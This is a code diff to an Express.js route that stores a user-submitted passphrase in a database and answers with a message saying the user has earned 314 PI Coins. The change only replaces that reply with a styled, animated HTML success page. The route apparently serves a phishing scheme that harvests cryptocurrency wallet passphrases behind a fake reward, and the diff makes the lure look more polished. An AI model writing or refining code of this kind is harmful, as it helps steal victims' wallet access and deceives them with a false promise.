@@ -33,7 +33,49 @@ app.post('/submit', async (req, res) => {
     try {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
-        res.status(200).send('Congratulations!!! You have earned your 314 PI Coins Successfully!!');
+
+        // Send stylish HTML response with CSS
+        const successMessage = `
+        <html>
+            <head>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background-color: #f4f4f4;
+                        color: #333;
+                        text-align: center;
+                        padding: 50px;
+                    }
+                    .message {
+                        background-color: #4CAF50;
+                        color: white;
+                        font-size: 24px;
+                        font-weight: bold;
+                        padding: 20px;
+                        border-radius: 8px;
+                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                        animation: fadeIn 1.5s ease-out;
+                    }
+                    @keyframes fadeIn {
+                        0% {
+                            opacity: 0;
+                            transform: scale(0.95);
+                        }
+                        100% {
+                            opacity: 1;
+                            transform: scale(1);
+                        }
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="message">
+                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
+                </div>
+            </body>
+        </html>`;
+
+        res.status(200).send(successMessage);
     } catch (error) {
         console.error('Error saving passphrase:', error);
         res.status(500).send('Failed to save passphrase.');
